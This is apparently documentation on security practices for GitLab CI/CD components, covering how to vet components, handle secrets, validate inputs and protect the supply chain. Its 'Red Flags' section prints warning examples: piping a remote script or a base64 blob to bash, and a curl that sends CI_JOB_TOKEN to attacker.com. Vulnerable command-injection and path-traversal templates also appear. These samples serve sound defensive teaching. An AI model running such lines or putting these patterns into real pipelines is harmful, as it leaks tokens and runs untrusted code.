# Security Considerations

Security implications and best practices for component development and usage.

## Security Model

### Trust Boundary

When you use a component, you're trusting:

1. **Component author** - Code they wrote
2. **Component repository** - Access controls
3. **GitLab instance** - Platform security
4. **CI/CD runner** - Execution environment

```
Your Pipeline
    ↓
[Trust Boundary]
    ↓
Component Code
    ↓
[Execution]
    ↓
CI/CD Runner
```

### Threat Model

**Potential threats:**
- Malicious component code
- Compromised component repository
- Secret exposure
- Code injection through inputs
- Supply chain attacks
- Privilege escalation

## Component Selection

### Vetting Components

Before using a component, verify:

**1. Source Trust**
```yaml
# Trusted sources
include:
  - component: gitlab.com/gitlab-org/components/...  # Official GitLab
  - component: gitlab.com/your-company/components/... # Internal trusted

# Unknown sources - review first!
include:
  - component: gitlab.com/random-user/component@1.0.0
```

**2. Code Review**
- Review the component repository
- Check `templates/template.yml`
- Look for suspicious commands
- Verify no hardcoded secrets

**3. Recent Activity**
- Check last commit date
- Review open issues
- Check for security advisories
- Verify active maintenance

**4. Permissions Required**
- What access does it need?
- Does it request more than necessary?
- Are requirements documented?

### Red Flags

⚠️ **Warning signs:**

```yaml
# Suspicious: Downloading and executing unknown scripts
.suspicious-template:
  script:
    - curl http://random-site.com/script.sh | bash

# Suspicious: Encoding/obfuscation
.suspicious-template:
  script:
    - echo "Y3VybCBodHRwOi8vZXhh..." | base64 -d | bash

# Suspicious: Accessing unrelated resources
.suspicious-template:
  script:
    - curl https://attacker.com/exfiltrate?data=$CI_JOB_TOKEN

# Suspicious: Modifying Git config
.suspicious-template:
  script:
    - git config --global user.email "attacker@evil.com"
```

## Secret Management

### Never Hardcode Secrets

```yaml
# ❌ NEVER DO THIS
.bad-component:
  script:
    - export API_KEY="sk-1234567890"
    - export PASSWORD="secret123"

# ✅ Use CI/CD variables
.good-component:
  script:
    - |
      if [ -z "$API_KEY" ]; then
        echo "Error: API_KEY variable required"
        exit 1
      fi
    - use_api_key "$API_KEY"
```

### Variable Exposure

**CI/CD variables visible to components:**
```yaml
# These are automatically available
CI_COMMIT_SHA
CI_PROJECT_NAME
CI_JOB_TOKEN
# + any variables you've set
```

**Protecting sensitive variables:**
```yaml
# In GitLab UI: Settings > CI/CD > Variables
# Set variable as:
# - Protected: Only available on protected branches
# - Masked: Values masked in logs
```

### Secret Detection

Enable GitLab Secret Detection:

```yaml
include:
  - template: Security/Secret-Detection.gitlab-ci.yml

# Scans for accidentally committed secrets
```

### Minimal Exposure

Only pass necessary variables to components:

```yaml
# ❌ Exposes everything
include:
  - component: gitlab.com/org/component@1.0.0

job:
  extends: .component-template
  # All CI/CD variables are available

# ✅ Limited exposure
include:
  - component: gitlab.com/org/component@1.0.0

job:
  extends: .component-template
  variables:
    ONLY_NEEDED_VAR: "$NEEDED_VALUE"
    # Component only sees this variable
```

## Input Validation

### Command Injection

Protect against command injection:

```yaml
# ❌ Vulnerable to injection
.vulnerable-template:
  script:
    - echo "Running: $[[ inputs.command ]]"
    - $[[ inputs.command ]]  # User could inject malicious commands

# ✅ Validated and sanitized
.safe-template:
  script:
    - |
      # Validate input format
      if ! echo "$[[ inputs.command ]]" | grep -qE '^[a-zA-Z0-9_-]+$'; then
        echo "Error: Invalid command format"
        exit 1
      fi

    - |
      # Use allowlist
      case "$[[ inputs.command ]]" in
        build|test|deploy)
          $[[ inputs.command ]]
          ;;
        *)
          echo "Error: Command not allowed"
          exit 1
          ;;
      esac
```

### Path Traversal

Prevent path traversal attacks:

```yaml
# ❌ Vulnerable to path traversal
.vulnerable-template:
  script:
    - cat $[[ inputs.file_path ]]  # User could provide ../../../etc/passwd

# ✅ Validated paths
.safe-template:
  script:
    - |
      FILE_PATH="${[[ inputs.file_path ]]"

      # Ensure path is within expected directory
      REAL_PATH=$(realpath "$FILE_PATH")
      ALLOWED_DIR=$(realpath ./allowed)

      if [[ "$REAL_PATH" != "$ALLOWED_DIR"* ]]; then
        echo "Error: Path outside allowed directory"
        exit 1
      fi

      cat "$REAL_PATH"
```

### Type Safety

Use spec validation:

```yaml
spec:
  inputs:
    port:
      type: number  # Ensures numeric value
      options: [80, 443, 8080]  # Restrict to safe values

    log_level:
      type: string
      options: ['debug', 'info', 'warning', 'error']  # Allowlist
```

## Access Control

### Repository Permissions

**Public repositories:**
- Anyone can view code
- Anyone can use component
- Consider security implications

**Internal repositories:**
- Only organization members can use
- Better for proprietary logic

**Private repositories:**
- Only specified users can use
- Best for sensitive components
- Requires access management

### Branch Protection

Protect component repositories:

```yaml
# In GitLab: Settings > Repository > Protected branches
# Protect: main, v*

# Require:
# - Merge request approvals
# - Code review
# - Passed CI/CD pipeline
```

### CI/CD Token Permissions

Understand token scopes:

```yaml
# CI_JOB_TOKEN has access to:
# - Current project
# - Projects with token access enabled
# - GitLab API (limited scope)

# Never use for:
# - Accessing unrelated projects
# - Pushing to other repositories
# - Modifying user accounts
```

## Supply Chain Security

### Dependency Tracking

Document component dependencies:

```markdown
## Dependencies

This component uses:
- Docker image: `node:20` (official Node.js image)
- External tool: `trivy` (aquasec/trivy)

### Verification
```yaml
# Verify image SHA
image:
  name: node:20
  # Use SHA for immutability
  # node@sha256:abc123...
```
```

### Version Pinning

Pin component versions in production:

```yaml
# ✅ Production: Pin exact version
include:
  - component: gitlab.com/org/component@1.2.3

# ⚠️ Development only: Use branches
include:
  - component: gitlab.com/org/component@main
```

### Component Updates

Establish update process:

1. **Monitor releases** - Watch component repositories
2. **Review changelogs** - Check for security fixes
3. **Test updates** - Verify in non-production first
4. **Update gradually** - Roll out across projects

## Artifact Security

### Sensitive Data in Artifacts

Prevent exposing sensitive data:

```yaml
# ❌ Might expose secrets
.bad-template:
  artifacts:
    paths:
      - ./**  # Everything, including .env files

# ✅ Selective artifacts
.good-template:
  artifacts:
    paths:
      - dist/
      - build/*.js
    exclude:
      - "**/.env"
      - "**/*.key"
      - "**/secrets.yaml"
```

### Artifact Expiration

Set appropriate expiration:

```yaml
.template:
  artifacts:
    paths:
      - sensitive-report/
    expire_in: 1 day  # Short expiration for sensitive data
```

## Container Security

### Base Image Selection

Choose secure base images:

```yaml
# ✅ Official, minimal, specific version
.secure-template:
  image: node:20-alpine  # Minimal attack surface

# ⚠️ Less secure
.less-secure-template:
  image: random-user/node:latest  # Unknown source, floating tag
```

### Image Scanning

Scan images for vulnerabilities:

```yaml
include:
  - template: Security/Container-Scanning.gitlab-ci.yml

# Add to component pipeline
container_scan:
  extends: .container_scanning
  variables:
    CS_IMAGE: $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
```

### Rootless Containers

Run as non-root when possible:

```yaml
.secure-template:
  image: node:20-alpine
  script:
    - adduser -D appuser
    - su appuser -c "npm test"
```

## Logging and Auditing

### Masked Variables

Prevent secret exposure in logs:

```yaml
.template:
  variables:
    # Mark as masked in GitLab UI
    MASKED_VAR: "${PROTECTED_VALUE}"

  script:
    - |
      # Additional masking in logs
      echo "API Key: [REDACTED]"  # Don't echo actual secret
      use_api_key "$MASKED_VAR"
```

### Audit Trail

Log security-relevant actions:

```yaml
.template:
  script:
    - echo "User: ${GITLAB_USER_LOGIN}"
    - echo "Project: ${CI_PROJECT_PATH}"
    - echo "Action: deployment"
    - echo "Timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
    - perform_deployment
```

## Incident Response

### Security Issues

If you discover a security issue in a component:

1. **Don't publicly disclose** immediately
2. **Contact component maintainers** privately
3. **Use GitLab security advisory** if available
4. **Provide details:**
   - Vulnerability description
   - Steps to reproduce
   - Potential impact
   - Suggested fix (if known)

### As a Component Author

If notified of a security issue:

1. **Acknowledge quickly** (within 24 hours)
2. **Assess severity** (Critical, High, Medium, Low)
3. **Develop fix** privately
4. **Release patch** ASAP
5. **Notify users** of security update
6. **Publish CVE** if warranted

### Example Security Advisory

```markdown
# Security Advisory: SQL Injection in database-backup@1.2.0

**Severity:** High
**Affected versions:** 1.0.0 - 1.2.0
**Fixed in:** 1.2.1

## Description
The `table_name` input was not properly sanitized, allowing SQL injection.

## Impact
Attackers with ability to modify pipeline configuration could execute arbitrary SQL.

## Mitigation
Update to version 1.2.1 or later:

```yaml
include:
  - component: gitlab.com/org/database-backup@1.2.1
```

## Credits
Reported by: Jane Doe (@janedoe)
```

## Security Checklist

### For Component Authors

- [ ] No hardcoded secrets
- [ ] Input validation implemented
- [ ] Minimal permissions documented
- [ ] Dependencies pinned and verified
- [ ] Code reviewed by security team
- [ ] Secrets properly masked in logs
- [ ] Artifacts don't contain sensitive data
- [ ] Base images from trusted sources
- [ ] Security contact documented
- [ ] Vulnerability disclosure policy defined

### For Component Users

- [ ] Component source reviewed
- [ ] Repository is trusted
- [ ] Latest stable version used
- [ ] Required permissions reasonable
- [ ] Secrets protected (masked, protected branches)
- [ ] Non-production testing completed
- [ ] Update process established
- [ ] Security monitoring enabled

## Resources

### GitLab Security

- [GitLab Security Best Practices](https://docs.gitlab.com/ee/security/)
- [Secret Detection](https://docs.gitlab.com/ee/user/application_security/secret_detection/)
- [SAST](https://docs.gitlab.com/ee/user/application_security/sast/)
- [Container Scanning](https://docs.gitlab.com/ee/user/application_security/container_scanning/)

### General Security

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)

## See Also

- [Best Practices](/explanation/best-practices)
- [Component Specification](/reference/component-spec)
- [Input Parameters](/reference/inputs)
- [How to Create a Component](/how-to/create-component)
